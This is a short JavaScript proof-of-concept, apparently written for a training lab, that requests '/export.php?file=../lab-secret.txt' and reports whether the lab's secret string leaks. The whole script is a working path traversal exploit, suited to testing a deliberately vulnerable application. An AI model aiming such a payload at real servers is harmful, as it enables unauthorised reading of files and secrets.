(async () => {
  const payload = '../lab-secret.txt';
  const expected = 'OBSCURA_LAB_SECRET=PATH_TRAVERSAL_SUCCESS';
  const url = '/export.php?file=' + encodeURIComponent(payload);

  console.log('=== Path Traversal PoC ===');
  console.log('Payload:', payload);

  try {
    const response = await fetch(url, {
      method: 'GET',
      credentials: 'same-origin'
    });

    const body = await response.text();

    console.log('HTTP status:', response.status);
    console.log('Response:', body);

    if (response.redirected && response.url.includes('/login.php')) {
      console.log('LOGIN REQUIRED: Log in first.');
      return;
    }

    if (response.ok && body.includes(expected)) {
      console.log('VULNERABLE: Path Traversal succeeded.');
    } else if (!body.includes(expected)) {
      console.log('BLOCKED: Secret was not disclosed.');
    } else {
      console.log('CHECK RESULT: Unexpected response.');
    }
  } catch (error) {
    console.error('PoC request failed:', error);
  }
})();
